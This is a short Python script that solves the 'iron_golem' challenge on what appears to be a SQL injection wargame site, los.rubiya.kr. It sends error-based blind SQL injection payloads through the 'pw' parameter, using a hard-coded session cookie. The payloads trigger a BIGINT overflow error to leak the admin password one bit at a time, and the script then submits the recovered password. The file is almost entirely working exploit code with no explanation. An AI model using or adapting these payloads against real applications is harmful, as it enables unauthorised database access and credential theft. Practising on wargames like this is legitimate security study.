import requests

def get(pw):
    return requests.get(
        'https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php',
        params={"pw":pw},
        cookies={'PHPSESSID': 'noefrhpr1bme4kn0b510mjnq01'}).text

# get length
length = 68
# while True:
#     print("Try length", length)
#     if "BIGINT" in get(f"'||id like 'admin'&&if(length(pw)={length},~0+1,0) -- -"):
#         break
#     length += 1
print("Length is", length)

# get char_length
char_length = 24 # by big length..

# get password
password = ''
for index in range(1, length // 4 + 1):
    tmp = ''
    for bit in range(1, char_length + 1):
        if "BIGINT" in get(f"'||id like 'admin'&&if(1=mid(lpad(bin(ord(mid(pw,{index},1))),{char_length},0),{bit},1),~0+1,0) -- -"):
           tmp += '1'
        else:
            tmp += '0'
    password += chr(int(tmp, 2))
    print(password)

# password is 

# certify
print(get(password))